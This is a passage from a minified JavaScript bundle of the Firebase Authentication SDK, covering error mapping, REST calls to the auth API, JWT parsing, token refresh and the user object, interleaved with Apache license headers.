 */function LU(n){Dl(new sa("platform-logger",e=>new q5(e),"PRIVATE")),Dl(new sa("heartbeat",e=>new RU(e),"PRIVATE")),no(oy,ZE,n),no(oy,ZE,"esm2017"),no("fire-js","")}LU("");function fv(n,e){var t={};for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&e.indexOf(r)<0&&(t[r]=n[r]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(n);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(n,r[i])&&(t[r[i]]=n[r[i]]);return t}function i2(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const DU=i2,s2=new lh("auth","Firebase",i2());/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kd=new cv("@firebase/auth");function OU(n,...e){kd.logLevel<=Qe.WARN&&kd.warn(`Auth (${ec}): ${n}`,...e)}function Rf(n,...e){kd.logLevel<=Qe.ERROR&&kd.error(`Auth (${ec}): ${n}`,...e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function pi(n,...e){throw dv(n,...e)}function Ti(n,...e){return dv(n,...e)}function o2(n,e,t){const r=Object.assign(Object.assign({},DU()),{[e]:t});return new lh("auth","Firebase",r).create(e,{appName:n.name})}function ro(n){return o2(n,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function dv(n,...e){if(typeof n!="string"){const t=e[0],r=[...e.slice(1)];return r[0]&&(r[0].appName=n.name),n._errorFactory.create(t,...r)}return s2.create(n,...e)}function Re(n,e,...t){if(!n)throw dv(e,...t)}function Ji(n){const e="INTERNAL ASSERTION FAILED: "+n;throw Rf(e),new Error(e)}function hs(n,e){n||Ji(e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function cy(){var n;return typeof self<"u"&&((n=self.location)===null||n===void 0?void 0:n.href)||""}function BU(){return nI()==="http:"||nI()==="https:"}function nI(){var n;return typeof self<"u"&&((n=self.location)===null||n===void 0?void 0:n.protocol)||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function UU(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(BU()||p5()||"connection"in navigator)?navigator.onLine:!0}function jU(){if(typeof navigator>"u")return null;const n=navigator;return n.languages&&n.languages[0]||n.language||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uh{constructor(e,t){this.shortDelay=e,this.longDelay=t,hs(t>e,"Short delay should be less than long delay!"),this.isMobile=h5()||g5()}get(){return UU()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function pv(n,e){hs(n.emulator,"Emulator should always be set here");const{url:t}=n.emulator;return e?`${t}${e.startsWith("/")?e.slice(1):e}`:t}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class a2{static initialize(e,t,r){this.fetchImpl=e,t&&(this.headersImpl=t),r&&(this.responseImpl=r)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;Ji("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;Ji("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;Ji("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const VU={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const FU=["/v1/accounts:signInWithCustomToken","/v1/accounts:signInWithEmailLink","/v1/accounts:signInWithIdp","/v1/accounts:signInWithPassword","/v1/accounts:signInWithPhoneNumber","/v1/token"],zU=new uh(3e4,6e4);function wa(n,e){return n.tenantId&&!e.tenantId?Object.assign(Object.assign({},e),{tenantId:n.tenantId}):e}async function vo(n,e,t,r,i={}){return l2(n,i,async()=>{let s={},o={};r&&(e==="GET"?o=r:s={body:JSON.stringify(r)});const a=ch(Object.assign({key:n.config.apiKey},o)).slice(1),l=await n._getAdditionalHeaders();l["Content-Type"]="application/json",n.languageCode&&(l["X-Firebase-Locale"]=n.languageCode);const u=Object.assign({method:e,headers:l},s);return d5()||(u.referrerPolicy="no-referrer"),a2.fetch()(await c2(n,n.config.apiHost,t,a),u)})}async function l2(n,e,t){n._canInitEmulator=!1;const r=Object.assign(Object.assign({},VU),e);try{const i=new $U(n),s=await Promise.race([t(),i.promise]);i.clearNetworkTimeout();const o=await s.json();if("needConfirmation"in o)throw of(n,"account-exists-with-different-credential",o);if(s.ok&&!("errorMessage"in o))return o;{const a=s.ok?o.errorMessage:o.error.message,[l,u]=a.split(" : ");if(l==="FEDERATED_USER_ID_ALREADY_LINKED")throw of(n,"credential-already-in-use",o);if(l==="EMAIL_EXISTS")throw of(n,"email-already-in-use",o);if(l==="USER_DISABLED")throw of(n,"user-disabled",o);const h=r[l]||l.toLowerCase().replace(/[_\s]+/g,"-");if(u)throw o2(n,h,u);pi(n,h)}}catch(i){if(i instanceof gs)throw i;pi(n,"network-request-failed",{message:String(i)})}}async function Bp(n,e,t,r,i={}){const s=await vo(n,e,t,r,i);return"mfaPendingCredential"in s&&pi(n,"multi-factor-auth-required",{_serverResponse:s}),s}async function c2(n,e,t,r){const i=`${e}${t}?${r}`,s=n,o=s.config.emulator?pv(n.config,i):`${n.config.apiScheme}://${i}`;return FU.includes(t)&&(await s._persistenceManagerAvailable,s._getPersistenceType()==="COOKIE")?s._getPersistence()._getFinalTarget(o).toString():o}function WU(n){switch(n){case"ENFORCE":return"ENFORCE";case"AUDIT":return"AUDIT";case"OFF":return"OFF";default:return"ENFORCEMENT_STATE_UNSPECIFIED"}}class $U{clearNetworkTimeout(){clearTimeout(this.timer)}constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((t,r)=>{this.timer=setTimeout(()=>r(Ti(this.auth,"network-request-failed")),zU.get())})}}function of(n,e,t){const r={appName:n.name};t.email&&(r.email=t.email),t.phoneNumber&&(r.phoneNumber=t.phoneNumber);const i=Ti(n,e,r);return i.customData._tokenResponse=t,i}function rI(n){return n!==void 0&&n.enterprise!==void 0}class HU{constructor(e){if(this.siteKey="",this.recaptchaEnforcementState=[],e.recaptchaKey===void 0)throw new Error("recaptchaKey undefined");this.siteKey=e.recaptchaKey.split("/")[3],this.recaptchaEnforcementState=e.recaptchaEnforcementState}getProviderEnforcementState(e){if(!this.recaptchaEnforcementState||this.recaptchaEnforcementState.length===0)return null;for(const t of this.recaptchaEnforcementState)if(t.provider&&t.provider===e)return WU(t.enforcementState);return null}isProviderEnabled(e){return this.getProviderEnforcementState(e)==="ENFORCE"||this.getProviderEnforcementState(e)==="AUDIT"}isAnyProviderEnabled(){return this.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")||this.isProviderEnabled("PHONE_PROVIDER")}}async function qU(n,e){return vo(n,"GET","/v2/recaptchaConfig",wa(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function KU(n,e){return vo(n,"POST","/v1/accounts:delete",e)}async function Cd(n,e){return vo(n,"POST","/v1/accounts:lookup",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function su(n){if(n)try{const e=new Date(Number(n));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function GU(n,e=!1){const t=bn(n),r=await t.getIdToken(e),i=gv(r);Re(i&&i.exp&&i.auth_time&&i.iat,t.auth,"internal-error");const s=typeof i.firebase=="object"?i.firebase:void 0,o=s==null?void 0:s.sign_in_provider;return{claims:i,token:r,authTime:su(Sm(i.auth_time)),issuedAtTime:su(Sm(i.iat)),expirationTime:su(Sm(i.exp)),signInProvider:o||null,signInSecondFactor:(s==null?void 0:s.sign_in_second_factor)||null}}function Sm(n){return Number(n)*1e3}function gv(n){const[e,t,r]=n.split(".");if(e===void 0||t===void 0||r===void 0)return Rf("JWT malformed, contained fewer than 3 sections"),null;try{const i=Qx(t);return i?JSON.parse(i):(Rf("Failed to decode base64 JWT payload"),null)}catch(i){return Rf("Caught error parsing JWT payload as JSON",i==null?void 0:i.toString()),null}}function iI(n){const e=gv(n);return Re(e,"internal-error"),Re(typeof e.exp<"u","internal-error"),Re(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Vu(n,e,t=!1){if(t)return e;try{return await e}catch(r){throw r instanceof gs&&QU(r)&&n.auth.currentUser===n&&await n.auth.signOut(),r}}function QU({code:n}){return n==="auth/user-disabled"||n==="auth/user-token-expired"}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YU{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){var t;if(e){const r=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),r}else{this.errorBackoff=3e4;const i=((t=this.user.stsTokenManager.expirationTime)!==null&&t!==void 0?t:0)-Date.now()-3e5;return Math.max(0,i)}}schedule(e=!1){if(!this.isRunning)return;const t=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},t)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){(e==null?void 0:e.code)==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uy{constructor(e,t){this.createdAt=e,this.lastLoginAt=t,this._initializeTime()}_initializeTime(){this.lastSignInTime=su(this.lastLoginAt),this.creationTime=su(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Rd(n){var e;const t=n.auth,r=await n.getIdToken(),i=await Vu(n,Cd(t,{idToken:r}));Re(i==null?void 0:i.users.length,t,"internal-error");const s=i.users[0];n._notifyReloadListener(s);const o=!((e=s.providerUserInfo)===null||e===void 0)&&e.length?u2(s.providerUserInfo):[],a=JU(n.providerData,o),l=n.isAnonymous,u=!(n.email&&s.passwordHash)&&!(a!=null&&a.length),h=l?u:!1,f={uid:s.localId,displayName:s.displayName||null,photoURL:s.photoUrl||null,email:s.email||null,emailVerified:s.emailVerified||!1,phoneNumber:s.phoneNumber||null,tenantId:s.tenantId||null,providerData:a,metadata:new uy(s.createdAt,s.lastLoginAt),isAnonymous:h};Object.assign(n,f)}async function ZU(n){const e=bn(n);await Rd(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function JU(n,e){return[...n.filter(r=>!e.some(i=>i.providerId===r.providerId)),...e]}function u2(n){return n.map(e=>{var{providerId:t}=e,r=fv(e,["providerId"]);return{providerId:t,uid:r.rawId||"",displayName:r.displayName||null,email:r.email||null,phoneNumber:r.phoneNumber||null,photoURL:r.photoUrl||null}})}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function XU(n,e){const t=await l2(n,{},async()=>{const r=ch({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:i,apiKey:s}=n.config,o=await c2(n,i,"/v1/token",`key=${s}`),a=await n._getAdditionalHeaders();return a["Content-Type"]="application/x-www-form-urlencoded",a2.fetch()(o,{method:"POST",headers:a,body:r})});return{accessToken:t.access_token,expiresIn:t.expires_in,refreshToken:t.refresh_token}}async function e8(n,e){return vo(n,"POST","/v2/accounts:revokeToken",wa(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gl{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){Re(e.idToken,"internal-error"),Re(typeof e.idToken<"u","internal-error"),Re(typeof e.refreshToken<"u","internal-error");const t="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):iI(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,t)}updateFromIdToken(e){Re(e.length!==0,"internal-error");const t=iI(e);this.updateTokensAndExpiration(e,null,t)}async getToken(e,t=!1){return!t&&this.accessToken&&!this.isExpired?this.accessToken:(Re(this.refreshToken,e,"user-token-expired"),this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null)}clearRefreshToken(){this.refreshToken=null}async refresh(e,t){const{accessToken:r,refreshToken:i,expiresIn:s}=await XU(e,t);this.updateTokensAndExpiration(r,i,Number(s))}updateTokensAndExpiration(e,t,r){this.refreshToken=t||null,this.accessToken=e||null,this.expirationTime=Date.now()+r*1e3}static fromJSON(e,t){const{refreshToken:r,accessToken:i,expirationTime:s}=t,o=new gl;return r&&(Re(typeof r=="string","internal-error",{appName:e}),o.refreshToken=r),i&&(Re(typeof i=="string","internal-error",{appName:e}),o.accessToken=i),s&&(Re(typeof s=="number","internal-error",{appName:e}),o.expirationTime=s),o}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new gl,this.toJSON())}_performRefresh(){return Ji("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function bs(n,e){Re(typeof n=="string"||typeof n>"u","internal-error",{appName:e})}class oi{constructor(e){var{uid:t,auth:r,stsTokenManager:i}=e,s=fv(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new YU(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=t,this.auth=r,this.stsTokenManager=i,this.accessToken=i.accessToken,this.displayName=s.displayName||null,this.email=s.email||null,this.emailVerified=s.emailVerified||!1,this.phoneNumber=s.phoneNumber||null,this.photoURL=s.photoURL||null,this.isAnonymous=s.isAnonymous||!1,this.tenantId=s.tenantId||null,this.providerData=s.providerData?[...s.providerData]:[],this.metadata=new uy(s.createdAt||void 0,s.lastLoginAt||void 0)}async getIdToken(e){const t=await Vu(this,this.stsTokenManager.getToken(this.auth,e));return Re(t,this.auth,"internal-error"),this.accessToken!==t&&(this.accessToken=t,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),t}getIdTokenResult(e){return GU(this,e)}reload(){return ZU(this)}_assign(e){this!==e&&(Re(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(t=>Object.assign({},t)),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const t=new oi(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return t.metadata._copy(this.metadata),t}_onReload(e){Re(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,t=!1){let r=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),r=!0),t&&await Rd(this),await this.auth._persistUserIfCurrent(this),r&&this.auth._notifyListenersIfCurrent(this)}async delete(){if(ii(this.auth.app))return Promise.reject(ro(this.auth));const e=await this.getIdToken();return await Vu(this,KU(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>Object.assign({},e)),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,t){var r,i,s,o,a,l,u,h;const f=(r=t.displayName)!==null&&r!==void 0?r:void 0,m=(i=t.email)!==null&&i!==void 0?i:void 0,v=(s=t.phoneNumber)!==null&&s!==void 0?s:void 0,x=(o=t.photoURL)!==null&&o!==void 0?o:void 0,k=(a=t.tenantId)!==null&&a!==void 0?a:void 0,I=(l=t._redirectEventId)!==null&&l!==void 0?l:void 0,S=(u=t.createdAt)!==null&&u!==void 0?u:void 0,b=(h=t.lastLoginAt)!==null&&h!==void 0?h:void 0,{uid:E,emailVerified:U,isAnonymous:H,providerData:q,stsTokenManager:L}=t;Re(E&&L,e,"internal-error");const N=gl.fromJSON(this.name,L);Re(typeof E=="string",e,"internal-error"),bs(f,e.name),bs(m,e.name),Re(typeof U=="boolean",e,"internal-error"),Re(typeof H=="boolean",e,"internal-error"),bs(v,e.name),bs(x,e.name),bs(k,e.name),bs(I,e.name),bs(S,e.name),bs(b,e.name);const B=new oi({uid:E,auth:e,email:m,emailVerified:U,displayName:f,isAnonymous:H,photoURL:x,phoneNumber:v,tenantId:k,stsTokenManager:N,createdAt:S,lastLoginAt:b});return q&&Array.isArray(q)&&(B.providerData=q.map(z=>Object.assign({},z))),I&&(B._redirectEventId=I),B}static async _fromIdTokenResponse(e,t,r=!1){const i=new gl;i.updateFromServerResponse(t);const s=new oi({uid:t.localId,auth:e,stsTokenManager:i,isAnonymous:r});return await Rd(s),s}static async _fromGetAccountInfoResponse(e,t,r){const i=t.users[0];Re(i.localId!==void 0,"internal-error");const s=i.providerUserInfo!==void 0?u2(i.providerUserInfo):[],o=!(i.email&&i.passwordHash)&&!(s!=null&&s.length),a=new gl;a.updateFromIdToken(r);const l=new oi({uid:i.localId,auth:e,stsTokenManager:a,isAnonymous:o}),u={uid:i.localId,displayName:i.displayName||null,photoURL:i.photoUrl||null,email:i.email||null,emailVerified:i.emailVerified||!1,phoneNumber:i.phoneNumber||null,tenantId:i.tenantId||null,providerData:s,metadata:new uy(i.createdAt,i.lastLoginAt),isAnonymous:!(i.email&&i.passwordHash)&&!(s!=null&&s.length)};return Object.assign(l,u),l}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const sI=new Map;function Xi(n){hs(n instanceof Function,"Expected a class definition");let e=sI.get(n);return e?(hs(e instanceof n,"Instance stored in cache mismatched with class"),e):(e=new n,sI.set(n,e),e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
